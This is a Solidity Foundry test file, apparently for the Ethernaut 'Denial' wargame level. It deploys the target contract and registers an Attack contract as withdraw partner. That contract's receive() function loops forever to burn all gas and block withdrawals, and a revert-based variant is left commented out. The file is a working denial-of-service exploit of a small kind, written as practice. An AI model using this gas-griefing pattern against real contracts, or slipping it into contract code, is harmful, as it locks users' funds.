// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/20_Denial.sol";

contract DenialTest is Test {
    Denial instance;
    Attack attacker;
    address player1;

    function setUp() public {
        player1 = vm.addr(1);

        instance = new Denial();
        address(instance).call{value: 1 ether}("");

        attacker = new Attack();
        instance.setWithdrawPartner(address(attacker));
    }

    function testattacker() public {
        vm.startPrank(player1, player1);
        instance.withdraw();
        assertEq(player1.balance, 0.01 ether);
        vm.stopPrank();
    }
}

contract Attack {
    receive() external payable {
        while (true) {}
    }

    // receive() external payable {
    //     revert();
    // }
}
